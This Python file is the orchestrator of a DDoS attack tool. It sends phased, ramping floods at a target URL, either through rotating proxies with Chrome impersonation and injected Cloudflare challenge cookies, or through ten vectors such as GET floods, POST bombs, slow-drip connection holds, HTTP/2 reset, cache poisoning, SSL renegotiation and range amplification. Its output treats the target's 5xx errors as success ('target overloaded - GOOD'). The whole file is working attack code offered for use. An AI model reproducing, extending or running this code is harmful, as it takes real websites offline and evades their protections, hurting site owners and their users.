"""
Auto Mode v2 - 5-Phase Adaptive Orchestrator
=============================================
Total redesign for Windows local environment with:

- Thread isolation: dashboard / health / attack run in separate threads
- Raw HTTP/1.1 engine (no aiohttp / curl_cffi overhead)
- Self-health monitor with WSAEWOULDBLOCK detection and adaptive RPS ladder
- 5 phases: RECON -> WARMUP -> RAMP -> PEAK -> VALIDATE -> COOLDOWN
- Phase 4.5 gate: ping check, mark NETWORK_SATURATED if RTT > 3000ms
- HTTP/1.1 fallback if achieved RPS < 10% of target during first 5 seconds
- Buffer validation: only count as SENT if socket.send returned full payload
- Process priority BELOW_NORMAL + affinity to even cores only

Public entry point:
    await run_auto_mode_v2(target, duration, target_rps, ...)
"""
from __future__ import annotations

import asyncio
import logging
import os
import queue
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

_RICH_CONSOLE = Console()

from core.attack.engines.multi_vector_engine import (
    run_multi_vector_engine,
)
from core.attack.engines.raw_http_engine import (
    EngineMetrics,
    ping_target_rtt,
    quick_throughput_probe,
    run_worker_in_thread,
)
from core.attack.specialized.proxy_amplifier import (
    SmartProxyRotator,
    extract_proxy_urls,
    run_amplifier_in_thread,
)
from core.monitor.auto_dashboard import AutoDashboard
from core.utils.throttle import (
    PhaseConfig,
    SelfHealthMonitor,
    apply_windows_optimization,
    build_phase_schedule,
    load_phase_config,
)

logger = logging.getLogger("auto_mode_v2")


# ----------------------------------------------------------------------
# Vector descriptor
# ----------------------------------------------------------------------

@dataclass
class VectorDef:
    """A single attack vector to spawn under Auto Mode v2."""
    name: str            # internal id (must match what dashboard expects)
    label: str           # display label
    rps_share: float     # 0.0..1.0 fraction of target_rps
    pool_size: int = 50
    pipeline_depth: int = 6
    path: Optional[str] = None  # override URL path
    vector_mode: str = "all"


@dataclass
class WorkerHandle:
    thread: threading.Thread
    stop_event: threading.Event
    result_dict: Dict[str, Any]
    vector_name: str


# ----------------------------------------------------------------------
# Auto Mode v2 Orchestrator
# ----------------------------------------------------------------------

class AutoModeV2:
    """
    Phase orchestrator. Owns dashboard, health monitor, and worker threads.
    Designed to be invoked from an asyncio event loop on the main thread.
    """

    def __init__(
        self,
        target: str,
        duration: int,
        target_rps: int,
        config_path: str = "config/auto_mode.json",
        proxy_pool: Any = None,
        cf_cookies: Optional[Dict[str, str]] = None,
    ) -> None:
        self.target = self._normalize_target(target)
        self.duration = max(10, int(duration))
        self.target_rps = max(50, int(target_rps))
        self.config = load_phase_config(config_path)
        self.proxy_pool = proxy_pool
        self.cf_cookies = cf_cookies or {}  # Store CF cookies for injection

        # Extract proxy URLs and decide engine mode
        self.proxy_urls = extract_proxy_urls(proxy_pool) if proxy_pool else []
        self.use_amplifier = len(self.proxy_urls) >= 10  # Need >=10 proxies
        self.proxy_rotator: Optional[SmartProxyRotator] = None
        if self.use_amplifier:
            self.proxy_rotator = SmartProxyRotator(self.proxy_urls)

        self.engine_cfg = self.config.get("engine", {})
        self.health_cfg = self.config.get("self_health", {})
        self.win_cfg = self.config.get("windows_optimization", {})
        self.thread_cfg = self.config.get("thread_isolation", {})
        self.validate_cfg = self.config.get("validation", {})

        # Build phase schedule (reserves first 5s for recon)
        self.phases: List[PhaseConfig] = build_phase_schedule(self.duration, self.config)

        # Components
        self.health = SelfHealthMonitor(
            loop_lag_threshold_ms=float(self.health_cfg.get("loop_lag_threshold_ms", 100)),
            wsa_block_threshold=int(self.health_cfg.get("wsa_would_block_threshold", 3)),
            wsa_block_window_seconds=float(self.health_cfg.get("wsa_would_block_window_seconds", 1.0)),
            throttle_factor=float(self.health_cfg.get("throttle_factor_on_overload", 0.5)),
            check_interval_seconds=float(self.health_cfg.get("loop_lag_check_interval_seconds", 2.0)),
        )

        self.dashboard = AutoDashboard(
            target=self.target,
            duration=float(self.duration),
            target_rps=self.target_rps,
            stalled_ms=int(self.thread_cfg.get("stalled_threshold_ms", 1500)),
            refresh_ms=int(self.thread_cfg.get("dashboard_refresh_ms", 50)),
        )

        # Worker bookkeeping
        self.workers: List[WorkerHandle] = []
        self.vectors: List[VectorDef] = self._define_vectors()

        # Cumulative result aggregation across workers
        self._final_metrics: Dict[str, Any] = {}
        self._workers_started_at: float = 0.0

    # ------------------------------------------------------------------
    # Setup helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_target(target: str) -> str:
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        return target

    def _define_vectors(self) -> List[VectorDef]:
        """
        Define vectors based on engine mode:
        - Amplifier mode (proxy_pool >=10): curl_cffi + chrome impersonation + proxy rotation
        - Raw mode (no proxy): raw HTTP/1.1 socket + Multi-Vector Engine (10 vectors total)
        """
        parsed = urlparse(self.target)
        base_path = parsed.path or "/"
        if parsed.query:
            base_path += "?" + parsed.query

        if self.use_amplifier:
            # Amplifier mode: 4 vectors, each targets different path style
            # SUSTAINED ATTACK MODE: More aggressive settings
            sep = "&" if "?" in base_path else "?"
            vectors = [
                VectorDef("amp_root", "Chrome+Proxy: Root", rps_share=0.30,
                          pool_size=150, pipeline_depth=1, path=base_path),
                VectorDef("amp_cache", "Chrome+Proxy: CacheBust", rps_share=0.30,
                          pool_size=150, pipeline_depth=1,
                          path=f"{base_path}{sep}nocache=1"),
                VectorDef("amp_search", "Chrome+Proxy: Search", rps_share=0.20,
                          pool_size=120, pipeline_depth=1,
                          path=f"{base_path}{sep}s=test"),
                VectorDef("amp_api", "Chrome+Proxy: API", rps_share=0.20,
                          pool_size=120, pipeline_depth=1,
                          path=f"{base_path}{sep}_=api"),
            ]
        else:
            # Raw mode: Multi-vector engine - 10 vectors total
            if not self.use_amplifier:
                vectors = [
                    VectorDef("mv_connhold", "Connection Hold", rps_share=0.10,
                              pool_size=1000, pipeline_depth=1, vector_mode="connhold"),
                    
                    VectorDef("mv_flood", "GET Flood", rps_share=0.15,
                              pool_size=1000, pipeline_depth=30, vector_mode="flood"),
                    
                    VectorDef("mv_post", "POST Bomb", rps_share=0.12,
                              pool_size=500, pipeline_depth=10, vector_mode="post"),
                    
                    VectorDef("mv_slow", "Slow Rate", rps_share=0.05,
                              pool_size=200, pipeline_depth=1, vector_mode="slow"),
                    
                    VectorDef("mv_h2reset", "HTTP/2 Reset", rps_share=0.25,
                              pool_size=100, pipeline_depth=1, vector_mode="h2reset"),
                    
                    VectorDef("mv_drip", "Slow Drip", rps_share=0.08,
                              pool_size=300, pipeline_depth=1, vector_mode="drip"),
                    
                    VectorDef("mv_cdnpoison", "Cache Poison", rps_share=0.10,
                              pool_size=500, pipeline_depth=5, vector_mode="cdnpoison"),
                    
                    VectorDef("mv_resexh", "Resource Exhaust", rps_share=0.10,
                              pool_size=300, pipeline_depth=3, vector_mode="resexh"),
                    
                    VectorDef("mv_sslreneg", "SSL Reneg", rps_share=0.03,
                              pool_size=100, pipeline_depth=1, vector_mode="sslreneg"),
                    
                    VectorDef("mv_rangeamp", "Range Amp", rps_share=0.02,
                              pool_size=200, pipeline_depth=1, vector_mode="rangeamp"),
                ]
        return vectors

    def _split_target_rps_per_worker(self, vector: VectorDef, num_workers: int) -> int:
        per_vec = max(50, int(self.target_rps * vector.rps_share))
        # In amplifier mode, oversubscribe per-worker target so semaphore drives saturation
        # (worker only achieves rps if proxies can actually reach target)
        if self.use_amplifier:
            # Aim ~2x per-worker so semaphore stays full
            per_vec = int(per_vec * 1.5)
        return max(20, per_vec // max(1, num_workers))

    # ------------------------------------------------------------------
    # Main entry
    # ------------------------------------------------------------------

    async def run(self) -> Dict[str, Any]:
        """
        Run Auto Mode v2 end-to-end. Returns final aggregated metrics dict.
        Safe to KeyboardInterrupt - performs clean shutdown.
        """
        # Apply platform-specific tuning
        if sys.platform == "win32":
            win_status = apply_windows_optimization(
                below_normal_priority=(self.win_cfg.get("process_priority", "BELOW_NORMAL") == "BELOW_NORMAL"),
                even_cores_only=bool(self.win_cfg.get("affinity_even_cores_only", True)),
            )
            logger.info("[v2] Windows tuning: %s", win_status)
        else:
            # Linux/Unix: set nice priority
            try:
                import os
                os.nice(5)  # Lower priority (higher nice value)
                win_status = {"priority_set": True, "affinity_cores": [], "platform": "linux"}
                logger.info("[v2] Linux tuning: nice +5")
            except Exception as e:
                win_status = {"priority_set": False, "affinity_cores": [], "platform": "linux", "error": str(e)}
                logger.warning("[v2] Linux tuning failed: %s", e)

        # Register vectors in dashboard FIRST (before workers start)
        for v in self.vectors:
            self.dashboard.register_vector(v.name, v.label)

        # Engine label depends on mode
        if self.use_amplifier:
            engine_label = f"chrome+proxy ({len(self.proxy_urls)})"
        else:
            engine_label = self.engine_cfg.get("default", "raw_http11")
        self.dashboard.set_engine_label(engine_label)

        proxy_note = ""
        if self.use_amplifier:
            proxy_note = f" proxies={len(self.proxy_urls)}"

        self.dashboard.set_global_note(
            f"win_priority={'OK' if win_status.get('priority_set') else 'no'} "
            f"affinity={win_status.get('affinity_cores', [])}"
            f"{proxy_note}"
        )

        # Start dashboard render thread (Live UI)
        self.dashboard.start()

        # Start self-health monitor on current loop
        self.health.start()

        # Health snapshot pump (relays health -> dashboard)
        health_pump_stop = asyncio.Event()
        health_pump_task = asyncio.create_task(self._health_pump_loop(health_pump_stop))

        try:
            # PHASE 0: RECON
            await self._phase_0_recon()

            # PHASE 1-3: spawn workers and run through ramp
            await self._spawn_workers()
            await self._phase_1_warmup()
            await self._phase_2_ramp()
            await self._phase_3_peak()

            # PHASE 4: VALIDATE (with ping check at midpoint)
            await self._phase_4_validate()

            # PHASE 5: COOLDOWN
            await self._phase_5_cooldown()
        except KeyboardInterrupt:
            logger.warning("[v2] KeyboardInterrupt - shutting down workers")
            self.dashboard.set_global_note("INTERRUPTED by user")
        except Exception as e:
            logger.exception("[v2] orchestrator error: %s", e)
            self.dashboard.set_global_note(f"ERROR: {type(e).__name__}: {e}")
        finally:
            # Stop pumps
            health_pump_stop.set()
            try:
                await asyncio.wait_for(health_pump_task, timeout=2)
            except Exception:
                health_pump_task.cancel()

            # Stop workers gracefully
            await self._shutdown_workers()

            # Stop health monitor
            await self.health.stop()

            # Aggregate final metrics
            self._final_metrics = self._aggregate_metrics()

            # Update dashboard final state and stop it
            self.dashboard.set_global_phase("DONE",
                                            len(self.phases),
                                            len(self.phases),
                                            duration=0.0,
                                            elapsed=0.0)
            # Give dashboard 1 last frame to render final state
            await asyncio.sleep(0.5)
            self.dashboard.stop()

        return self._final_metrics

    # ------------------------------------------------------------------
    # Phase implementations
    # ------------------------------------------------------------------

    async def _phase_0_recon(self) -> None:
        """Phase 0: Recon. No traffic. Resolve target and prepare."""
        p = self.phases[0]
        self.dashboard.set_global_phase(p.label, 1, len(self.phases),
                                        duration=p.duration_seconds, elapsed=0.0)
        self.health.set_state_label(p.label)
        for v in self.vectors:
            self.dashboard.set_vector_status(v.name, "STARTING")

        start = time.time()
        # Resolve DNS and ping
        rtt = await ping_target_rtt(self.target, timeout=5.0)
        if rtt is None:
            self.dashboard.set_global_note("recon: target unreachable")
            self.health.report_network_rtt(99999.0)
        else:
            self.dashboard.set_global_note(f"recon: target_rtt={rtt:.0f}ms OK")
            self.health.report_network_rtt(rtt)

        # Wait remainder of phase
        while time.time() - start < p.duration_seconds:
            self.dashboard.set_global_phase(
                p.label, 1, len(self.phases),
                duration=p.duration_seconds,
                elapsed=time.time() - start,
            )
            await asyncio.sleep(0.25)

    async def _fallback_probe(self) -> None:
        # REMOVED: This probe caused false-positive low_throughput detection
        # on long-distance targets (RTT >1000ms), throttling the engine to 30%
        # permanently. The raw engine self-tunes, no probe needed.
        pass

    async def _spawn_workers(self) -> None:
        """Spawn one or more threads per vector. Each runs its own asyncio loop."""
        cpu_count = os.cpu_count() or 4

        # Record actual start time for duration calculation
        self._workers_started_at = time.time()

        # Amplifier mode: scale aggressively with proxy count
        # Each worker holds ~150 concurrent persistent sessions
        if self.use_amplifier:
            proxy_count = len(self.proxy_urls)
            if proxy_count >= 500:
                workers_per_vector = min(8, max(4, cpu_count // 2))  # UPGRADED: 6 → 8
            elif proxy_count >= 100:
                workers_per_vector = min(6, max(3, cpu_count // 3))  # UPGRADED: 4 → 6
            else:
                workers_per_vector = max(2, min(3, cpu_count // 4))
        else:
            # SUPER AGGRESSIVE MODE: More workers = more parallel connections = BRUTAL RPS
            workers_per_vector = min(8, max(6, cpu_count // 2))  # UPGRADED: 3 → 8 workers

        stats_q = self.dashboard.get_stats_queue()

        # Build a wrapper around stats_q that injects vector_name into items
        def make_queue_proxy(vector_name: str):
            class _Proxy:
                def put_nowait(self, item):
                    if isinstance(item, dict):
                        item["vector_name"] = vector_name
                    stats_q.put_nowait(item)
                def get_nowait(self):
                    return stats_q.get_nowait()
            return _Proxy()

        for v in self.vectors:
            # Build per-vector target URL: same scheme/host but vector-specific path
            parsed = urlparse(self.target)
            vector_path = v.path or (parsed.path or "/")
            if parsed.query and "?" not in vector_path and not vector_path.endswith(parsed.query):
                pass
            vector_target = f"{parsed.scheme}://{parsed.netloc}{vector_path}"

            for w_idx in range(workers_per_vector):
                stop_evt = threading.Event()
                result: Dict[str, Any] = {}
                worker_target_rps = self._split_target_rps_per_worker(v, workers_per_vector)
                proxy_q = make_queue_proxy(v.name)
                worker_id = hash((v.name, w_idx)) & 0xFFFF
                # Workers run until stop_event, not a fixed duration.
                # Use a large value so only _shutdown_workers() stops them.
                remaining_duration = float(self.duration) * 10.0

                if v.name.startswith("mv_"):
                    th = threading.Thread(
                        target=run_multi_vector_engine,
                        name=f"mvector_{v.name}_{w_idx}",
                        kwargs=dict(
                            target_url=vector_target,
                            duration_seconds=remaining_duration,
                            target_rps=worker_target_rps,
                            worker_id=worker_id,
                            stats_queue=proxy_q,
                            stop_event=stop_evt,
                            proxy_urls=self.proxy_urls if self.proxy_urls else None,
                            result_dict=result,
                            vector_mode=v.vector_mode,
                        ),
                        daemon=True,
                    )
                elif self.use_amplifier and self.proxy_rotator is not None:
                    th = threading.Thread(
                        target=run_amplifier_in_thread,
                        name=f"amp_{v.name}_{w_idx}",
                        kwargs=dict(
                            target_url=vector_target,
                            proxy_rotator=self.proxy_rotator,
                            target_rps=worker_target_rps,
                            duration_seconds=remaining_duration,
                            worker_id=worker_id,
                            stats_queue=proxy_q,
                            stop_event=stop_evt,
                            rps_factor_callable=self.health.get_rps_factor,
                            concurrent_per_worker=500,
                            vector_name=v.name,
                            result_dict=result,
                            cf_cookies=self.cf_cookies,  # INJECT CF COOKIES!
                        ),
                        daemon=True,
                    )
                else:
                    th = threading.Thread(
                        target=run_worker_in_thread,
                        name=f"raw_{v.name}_{w_idx}",
                        kwargs=dict(
                            target_url=vector_target,
                            target_rps=worker_target_rps,
                            duration_seconds=remaining_duration,
                            worker_id=worker_id,
                            stats_queue=proxy_q,
                            stop_event=stop_evt,
                            rps_factor_callable=self.health.get_rps_factor,
                            wsa_block_callback=lambda c: self.health.report_wsa_block(),
                            local_drop_callback=lambda c: self.health.report_local_drop(int(c)),
                            pipeline_depth=v.pipeline_depth,
                            pool_size=v.pool_size,
                            send_chunk=int(self.engine_cfg.get("socket_send_chunk_bytes", 1024)),
                            result_dict=result,
                        ),
                        daemon=True,
                    )

                self.workers.append(WorkerHandle(
                    thread=th, stop_event=stop_evt,
                    result_dict=result, vector_name=v.name,
                ))
                th.start()

        for v in self.vectors:
            self.dashboard.set_vector_status(v.name, "WARMUP")

    async def _phase_1_warmup(self) -> None:
        p = self.phases[1]
        await self._run_phase(p, 1, target_factor=p.rps_factor)
        for v in self.vectors:
            self.dashboard.set_vector_status(v.name, "ACTIVE")

    async def _phase_2_ramp(self) -> None:
        p = self.phases[2]
        # Step ladder: 0.35 -> 0.5 -> 0.75 over the phase
        steps = [0.35, 0.55, 0.80]
        per_step = p.duration_seconds / len(steps)
        for step_idx, factor in enumerate(steps):
            self.health.set_rps_factor(factor)
            await self._run_partial_phase(p, 2, factor, per_step,
                                          phase_index_in_ramp=step_idx + 1,
                                          total_steps=len(steps))

    async def _phase_3_peak(self) -> None:
        p = self.phases[3]
        self.health.set_rps_factor(p.rps_factor)
        await self._run_phase(p, 3, target_factor=p.rps_factor)

    async def _phase_4_validate(self) -> None:
        p = self.phases[4]
        # Run gate at midpoint
        half = p.duration_seconds / 2.0
        self.health.set_state_label("VALIDATE_BEFORE_GATE")
        await self._run_partial_phase(p, 4, p.rps_factor, half, total_steps=2,
                                      phase_index_in_ramp=1)

        # GATE: ping check
        self.dashboard.set_global_note("gate: pinging target...")
        rtt = await ping_target_rtt(self.target, timeout=5.0)
        threshold = float(self.config["phases"]["phase_4_validate"].get("ping_rtt_threshold_ms", 3000))
        sat_factor = float(self.config["phases"]["phase_4_validate"].get("saturated_rps_factor", 0.25))

        if rtt is None or rtt > threshold:
            self.dashboard.set_global_note(
                f"gate: NETWORK_SATURATED rtt={rtt if rtt else 'TIMEOUT'}"
            )
            self.health.mark_saturated(True)
            self.health.set_rps_factor(sat_factor)
            for v in self.vectors:
                self.dashboard.set_vector_status(v.name, "THROTTLED")
        else:
            self.dashboard.set_global_note(f"gate: rtt_ok {rtt:.0f}ms")
            self.health.report_network_rtt(rtt)

        # Run remainder of validate phase
        await self._run_partial_phase(p, 4, self.health.get_rps_factor(),
                                      half, total_steps=2,
                                      phase_index_in_ramp=2)

    async def _phase_5_cooldown(self) -> None:
        p = self.phases[5]
        # Linear ramp down: factor -> 0
        steps = 4
        per_step = p.duration_seconds / steps
        start_factor = self.health.get_rps_factor()
        for i in range(steps):
            new_factor = max(0.05, start_factor * (1.0 - (i + 1) / steps))
            self.health.set_rps_factor(new_factor)
            for v in self.vectors:
                self.dashboard.set_vector_status(v.name, "COOLDOWN")
            await self._run_partial_phase(p, 5, new_factor, per_step,
                                          phase_index_in_ramp=i + 1, total_steps=steps)
        for v in self.vectors:
            self.dashboard.set_vector_status(v.name, "DONE")

    # ------------------------------------------------------------------
    # Phase runner helpers
    # ------------------------------------------------------------------

    async def _run_phase(self, p: PhaseConfig, idx: int, target_factor: float) -> None:
        """Run a single full phase, updating dashboard every 100ms."""
        self.health.set_rps_factor(target_factor)
        self.health.set_state_label(p.label)
        start = time.time()
        while time.time() - start < p.duration_seconds:
            self.dashboard.set_global_phase(
                p.label, idx + 1, len(self.phases),
                duration=p.duration_seconds,
                elapsed=time.time() - start,
            )
            await asyncio.sleep(0.1)

    async def _run_partial_phase(
        self,
        p: PhaseConfig,
        idx: int,
        target_factor: float,
        duration: float,
        phase_index_in_ramp: int = 1,
        total_steps: int = 1,
    ) -> None:
        """Run a sub-section of a phase (used by ramp/cooldown for stepped factors)."""
        self.health.set_state_label(f"{p.label}/{phase_index_in_ramp}of{total_steps}")
        start = time.time()
        while time.time() - start < duration:
            self.dashboard.set_global_phase(
                f"{p.label} ({phase_index_in_ramp}/{total_steps}, factor={target_factor:.2f})",
                idx + 1, len(self.phases),
                duration=duration,
                elapsed=time.time() - start,
            )
            await asyncio.sleep(0.1)

    # ------------------------------------------------------------------
    # Health pump (relays SelfHealthMonitor -> dashboard)
    # ------------------------------------------------------------------

    async def _health_pump_loop(self, stop_event: asyncio.Event) -> None:
        """Push health snapshots to dashboard every 200ms."""
        try:
            while not stop_event.is_set():
                snap = self.health.snapshot()
                self.dashboard.set_global_health({
                    "loop_lag_ms": snap.loop_lag_ms,
                    "wsa_block_count_1s": snap.wsa_block_count_1s,
                    "current_rps_factor": snap.current_rps_factor,
                    "is_overloaded": snap.is_overloaded,
                    "is_saturated": snap.is_saturated,
                    "network_rtt_ms": snap.network_rtt_ms,
                })
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=0.2)
                except asyncio.TimeoutError:
                    continue
        except asyncio.CancelledError:
            return

    # ------------------------------------------------------------------
    # Shutdown
    # ------------------------------------------------------------------

    async def _shutdown_workers(self) -> None:
        """Signal all workers to stop and wait for them with timeout."""
        for w in self.workers:
            w.stop_event.set()

        # Join workers in thread executor (not on main loop)
        loop = asyncio.get_event_loop()
        for w in self.workers:
            try:
                await loop.run_in_executor(None, w.thread.join, 3.0)
            except Exception:
                pass

    def _aggregate_metrics(self) -> Dict[str, Any]:
        """Sum all worker results into final metrics."""
        agg = {
            "total_requests": 0,
            "completed": 0,
            "failed": 0,
            "timeout": 0,
            "local_drops": 0,
            "wsa_blocks": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "cf_blocked": 0,
            "cf_challenge": 0,
            "origin_ok": 0,
            "origin_down": 0,
            "no_proxy_skip": 0,
            "actual_rps": 0.0,
            "duration": float(self.duration),
            "target": self.target,
            "target_rps": self.target_rps,
            "engine": "amplifier" if self.use_amplifier else self.engine_cfg.get("default", "raw_http11"),
            "proxy_count": len(self.proxy_urls),
            "vectors": [],
        }
        per_vector: Dict[str, Dict[str, Any]] = {}
        for w in self.workers:
            r = w.result_dict
            sent = int(r.get("sent", 0))
            agg["completed"] += int(r.get("completed", 0))
            agg["failed"] += int(r.get("failed", 0))
            agg["timeout"] += int(r.get("timeout", 0))
            agg["local_drops"] += int(r.get("local_drops", 0))
            agg["wsa_blocks"] += int(r.get("wsa_blocks", 0))
            agg["bytes_sent"] += int(r.get("bytes_sent", 0))
            agg["bytes_received"] += int(r.get("bytes_received", 0))
            agg["cf_blocked"] += int(r.get("cf_blocked", 0))
            agg["cf_challenge"] += int(r.get("cf_challenge", 0))
            agg["origin_ok"] += int(r.get("origin_ok", 0))
            agg["origin_down"] += int(r.get("origin_down", 0))
            agg["no_proxy_skip"] += int(r.get("no_proxy_skip", 0))
            agg["total_requests"] += sent

            pv = per_vector.setdefault(w.vector_name, {
                "name": w.vector_name,
                "sent": 0, "completed": 0, "failed": 0,
                "timeout": 0, "local_drops": 0, "wsa_blocks": 0,
                "bytes_sent": 0, "bytes_received": 0,
                "cf_blocked": 0, "cf_challenge": 0,
                "origin_ok": 0, "origin_down": 0,
            })
            pv["sent"] += sent
            pv["completed"] += int(r.get("completed", 0))
            pv["failed"] += int(r.get("failed", 0))
            pv["timeout"] += int(r.get("timeout", 0))
            pv["local_drops"] += int(r.get("local_drops", 0))
            pv["wsa_blocks"] += int(r.get("wsa_blocks", 0))
            pv["bytes_sent"] += int(r.get("bytes_sent", 0))
            pv["bytes_received"] += int(r.get("bytes_received", 0))
            pv["cf_blocked"] += int(r.get("cf_blocked", 0))
            pv["cf_challenge"] += int(r.get("cf_challenge", 0))
            pv["origin_ok"] += int(r.get("origin_ok", 0))
            pv["origin_down"] += int(r.get("origin_down", 0))

        # Add proxy stats if amplifier mode
        if self.proxy_rotator is not None:
            agg["proxy_stats"] = self.proxy_rotator.stats()

        agg["vectors"] = list(per_vector.values())
        if agg["duration"] > 0:
            agg["actual_rps"] = agg["total_requests"] / agg["duration"]
        return agg


# ----------------------------------------------------------------------
# Public entry point
# ----------------------------------------------------------------------

async def run_auto_mode_v2(
    target: str,
    duration: int,
    target_rps: int,
    config_path: str = "config/auto_mode.json",
    proxy_pool: Any = None,
    cf_cookies: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    """
    Run the redesigned Auto Mode v2.

    Args:
        target: target URL (https://...)
        duration: total duration in seconds
        target_rps: peak target RPS
        config_path: path to auto_mode.json
        proxy_pool: optional ProxyPool (currently unused by raw engine)
        cf_cookies: Cloudflare cookies from challenge solver

    Returns:
        dict with aggregated metrics
    """
    orchestrator = AutoModeV2(
        target=target,
        duration=duration,
        target_rps=target_rps,
        config_path=config_path,
        proxy_pool=proxy_pool,
        cf_cookies=cf_cookies,
    )
    return await orchestrator.run()


# ----------------------------------------------------------------------
# Print helper for CLI
# ----------------------------------------------------------------------

def print_auto_mode_v2_summary(result: Dict[str, Any]) -> None:
    """Print a clean summary of Auto Mode v2 result."""
    
    # Main summary table
    summary = Table(title="[bold cyan]AUTO MODE V2 SUMMARY[/]", box=box.HEAVY_EDGE,
                    border_style="cyan")
    summary.add_column("Metric", style="bold white", width=20)
    summary.add_column("Value", justify="right", ratio=1)
    
    summary.add_row("Target", f"[cyan]{result.get('target', '?')}[/]")
    summary.add_row("Duration", f"{result.get('duration', 0):.0f}s")
    summary.add_row("Target RPS", f"{result.get('target_rps', 0)}")
    summary.add_row("Engine", f"[yellow]{result.get('engine', '?')}[/]")
    if result.get('proxy_count', 0) > 0:
        summary.add_row("Proxy Pool", f"[green]{result['proxy_count']}[/] proxies")
    summary.add_row("", "")
    summary.add_row("Total Sent", f"[bright_blue]{result.get('total_requests', 0):,}[/]")
    summary.add_row("Completed", f"[green]{result.get('completed', 0):,}[/]")
    summary.add_row("Failed", f"[red]{result.get('failed', 0):,}[/]")
    summary.add_row("Timeout", f"[yellow]{result.get('timeout', 0):,}[/]")
    summary.add_row("Actual RPS", f"[bold yellow]{result.get('actual_rps', 0):.1f}[/]")
    
    _RICH_CONSOLE.print()
    _RICH_CONSOLE.print(summary)
    
    # Amplifier-specific metrics
    if result.get('engine') == 'amplifier':
        amp_table = Table(box=box.SIMPLE, border_style="bright_black")
        amp_table.add_column("Metric", style="bold white")
        amp_table.add_column("Value", justify="right")
        amp_table.add_row("Origin OK (2xx)", f"[green]{result.get('origin_ok', 0):,}[/] (these REACHED target)")
        amp_table.add_row("Origin Down (5xx)", f"[red]{result.get('origin_down', 0):,}[/] (target overloaded - GOOD)")
        amp_table.add_row("CF Blocked (403)", f"[yellow]{result.get('cf_blocked', 0):,}[/] (proxy IP blacklisted by CF)")
        amp_table.add_row("CF Challenge", f"[yellow]{result.get('cf_challenge', 0):,}[/] (CF served challenge page)")
        amp_table.add_row("Bytes Received", f"[bright_blue]{result.get('bytes_received', 0):,}[/]")
        _RICH_CONSOLE.print(amp_table)
        
        ps = result.get('proxy_stats', {})
        if ps:
            proxy_table = Table(title="Proxy Stats", box=box.SIMPLE, border_style="bright_black")
            proxy_table.add_column("Metric", style="bold white")
            proxy_table.add_column("Value", justify="right")
            proxy_table.add_row("Healthy", f"[green]{ps.get('healthy', 0)}[/] / {ps.get('total', 0)}")
            proxy_table.add_row("Blacklisted", f"[red]{ps.get('blacklisted', 0)}[/]")
            proxy_table.add_row("Total picks", f"[bright_blue]{ps.get('picks', 0):,}[/]")
            proxy_table.add_row("No-available", f"[yellow]{ps.get('no_available', 0):,}[/]")
            _RICH_CONSOLE.print(proxy_table)
    else:
        extra_table = Table(box=box.SIMPLE, border_style="bright_black")
        extra_table.add_column("Metric", style="bold white")
        extra_table.add_column("Value", justify="right")
        extra_table.add_row("Local Drops", f"[red]{result.get('local_drops', 0):,}[/]")
        extra_table.add_row("WSA Blocks", f"[yellow]{result.get('wsa_blocks', 0):,}[/]")
        extra_table.add_row("Bytes Sent", f"[bright_blue]{result.get('bytes_sent', 0):,}[/]")
        _RICH_CONSOLE.print(extra_table)
    
    # Per-vector breakdown
    if result.get("vectors"):
        vec_table = Table(title="Per Vector Breakdown", box=box.SIMPLE,
                          border_style="bright_black")
        if result.get('engine') == 'amplifier':
            vec_table.add_column("Vector", style="bold white")
            vec_table.add_column("Sent", justify="right")
            vec_table.add_column("Origin OK", justify="right")
            vec_table.add_column("Down", justify="right")
            vec_table.add_column("CF Block", justify="right")
            vec_table.add_column("CF Chal", justify="right")
            vec_table.add_column("Fail", justify="right")
            for v in result["vectors"]:
                vec_table.add_row(
                    v['name'],
                    f"{v['sent']:,}",
                    f"[green]{v['origin_ok']:,}[/]",
                    f"[red]{v['origin_down']:,}[/]",
                    f"[yellow]{v['cf_blocked']:,}[/]",
                    f"[yellow]{v['cf_challenge']:,}[/]",
                    f"[red]{v['failed']:,}[/]",
                )
        else:
            vec_table.add_column("Vector", style="bold white")
            vec_table.add_column("Sent", justify="right")
            vec_table.add_column("OK", justify="right")
            vec_table.add_column("Fail", justify="right")
            vec_table.add_column("Drop", justify="right")
            vec_table.add_column("WSA", justify="right")
            for v in result["vectors"]:
                vec_table.add_row(
                    v['name'],
                    f"{v['sent']:,}",
                    f"[green]{v['completed']:,}[/]",
                    f"[red]{v['failed']:,}[/]",
                    f"[yellow]{v.get('local_drops', 0):,}[/]",
                    f"[yellow]{v.get('wsa_blocks', 0):,}[/]",
                )
        _RICH_CONSOLE.print(vec_table)
    
    _RICH_CONSOLE.print()
